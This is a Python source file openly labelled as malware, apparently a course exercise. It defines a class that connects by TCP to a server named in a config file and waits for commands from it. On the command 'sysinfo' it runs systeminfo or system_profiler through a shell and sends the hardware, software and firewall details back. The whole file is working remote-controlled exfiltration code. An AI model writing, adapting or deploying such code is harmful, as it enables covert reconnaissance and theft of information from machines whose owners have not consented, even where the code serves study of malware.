# Hello, This is the malware package
# Malware to connect to the socket and send a message to the server and then close the connection.
import json
import os
import socket
import subprocess
import sys
import time

import pyfiglet


class Malware:
    def __init__(self, advanced_mode=False):
        """
        read data from config.json file and create a socket object to connect to the server
        :param advanced_mode: if True, the malware will collect the system information and connect to the server
        """
        self.socket = None
        curr_dir_par = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
        with open(os.path.join(curr_dir_par, 'data', 'config.json')) as f:
            data = json.load(f)
            # read IP, port from it
            self.ip = data['IP']
            self.port = data['Port']

        self.fields = data['Fields']
        self.__connect()
        if advanced_mode:
            self.__create_fields()

    def __connect(self):
        """
        create a socket object and connect to the server with the IP and port from config.json file
        :return: None
        """
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        host = socket.gethostname() if self.ip == 'localhost' else self.ip
        self.socket.connect((host, self.port))

    def __get_message(self):
        """
        get the message from the server
        :return: the message from the server
        """
        return self.socket.recv(2048).decode('utf-8')

    def __send_message(self, msg):
        """
        send the message to the server
        :param msg: the message to send
        :return: None
        """
        self.socket.send(msg.encode('utf-8'))

    def __create_fields(self):
        """
        collect the system information and save it in self.fields variable
        :return: None
        """
        if sys.platform == 'darwin':
            proc = subprocess.Popen(
                'system_profiler SPHardwareDataType SPSoftwareDataType SPFirewallDataType', shell=True,
                stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        else:
            proc = subprocess.Popen('systeminfo', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                    stdin=subprocess.PIPE)
        stdout_value = proc.stdout.read() + proc.stderr.read()
        self.fields = stdout_value.decode('utf-8')

    def run(self):
        """
        run the malware
        :return: None
        """
        while True:
            msg = self.__get_message()
            if msg == 'exit':
                self.__send_message('exiting...')
                print(self.__get_message())
                break
            elif msg == 'sysinfo':
                self.__send_message(self.fields)
            time.sleep(1)

    def close(self):
        """
        close the socket
        :return: None
        """
        self.socket.close()

    def __del__(self):
        """
        close the socket when the object is deleted
        :return: None
        """
        self.close()


if __name__ == '__main__':
    print(pyfiglet.figlet_format('Part Three'))
    malware = Malware(advanced_mode=True)
    malware.run()
    malware.close()
